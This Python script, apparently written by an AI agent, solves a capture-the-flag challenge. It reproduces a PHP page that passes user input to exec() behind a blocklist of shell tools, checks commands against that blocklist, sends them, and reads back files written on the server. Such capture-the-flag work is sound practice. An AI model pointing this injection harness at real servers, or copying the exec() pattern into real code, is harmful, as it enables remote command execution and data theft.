#!/usr/bin/env python3
"""
solve-recon.py -- lane: RECON (agent-1, task t1)
Target: http://node4.anna.nssctf.cn:27309/  (Apache/2.4.25 Debian, PHP/5.6.40)

index.php:
    <?php highlight_file(__FILE__);
    if(isset($_GET['url'])){ $url=$_GET['url'];
      if(preg_match('/bash|nc|wget|ping|ls|cat|more|less|phpinfo|base64|echo|php|python|mv|cp|la|\-|\*|\"|\>|\<|\%|\$/i',$url)){ echo "Sorry,you can't use this."; }
      else { echo "Can you see anything?"; exec($url); } }

Pipeline:
  1. local regex simulator (must PASS before anything is sent)
  2. send payload, assert body contains "Can you see anything?" (i.e. NOT blocked)
  3. fetch the written file back over HTTP and print the raw body

Usage:
  python solve-recon.py check '<decoded command>'      # simulate filter only
  python solve-recon.py run '<decoded command>' FILE   # send + fetch FILE
  python solve-recon.py fetch FILE                     # GET /FILE
"""
import sys
import re
import time
import urllib.parse
import urllib.request

BASE = "http://node4.anna.nssctf.cn:27309/"
BLOCK = re.compile(r'bash|nc|wget|ping|ls|cat|more|less|phpinfo|base64|echo|php|python|mv|cp|la|-|\*|"|>|<|%|\$', re.I)


def blocked(cmd: str):
    """Return the offending substring if the payload would be rejected, else None."""
    m = BLOCK.search(cmd)
    return m.group(0) if m else None


def http_get(path: str, timeout: int = 40) -> str:
    req = urllib.request.Request(BASE + path, headers={"User-Agent": "curl/7.64"})
    with urllib.request.urlopen(req, timeout=timeout) as r:
        return r.read().decode("utf-8", "replace")


def real_output(body: str) -> str:
    """The page starts with highlight_file(__FILE__) inside <code>..</code>.
    Everything after the LAST </code> is the genuine echo/exec marker."""
    idx = body.rfind("</code>")
    return body[idx + len("</code>"):].strip() if idx != -1 else body.strip()


def send(cmd: str, timeout: int = 90) -> str:
    bad = blocked(cmd)
    if bad is not None:
        raise SystemExit("LOCAL FILTER REJECT: command %r contains banned %r" % (cmd, bad))
    q = urllib.parse.quote(cmd, safe="")
    url = BASE + "?url=" + q
    print("[>] %s" % url)
    print("[i] decoded: %s" % cmd)
    body = http_get("?url=" + q, timeout=timeout)
    out = real_output(body)
    print("[i] effective response after source dump: %r" % out)
    if "Can you see anything?" not in out:
        raise SystemExit("BLOCKED or unexpected: %r" % out[:200])
    print("[+] exec marker present (payload passed the filter)")
    return body


def run(cmd: str, outfile: str):
    send(cmd)
    time.sleep(1.0)
    body = http_get(outfile)
    print("[+] %s (%d bytes)" % (BASE + outfile, len(body)))
    print("-" * 60)
    print(body)
    print("-" * 60)
    return body


if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(__doc__)
        sys.exit(1)
    action = sys.argv[1]
    if action == "check":
        c = sys.argv[2]
        b = blocked(c)
        print("REJECTED on %r" % b if b else "PASSES filter")
    elif action == "run":
        run(sys.argv[2], sys.argv[3])
    elif action == "fetch":
        print(http_get(sys.argv[2]))
    else:
        print(__doc__)
        sys.exit(1)
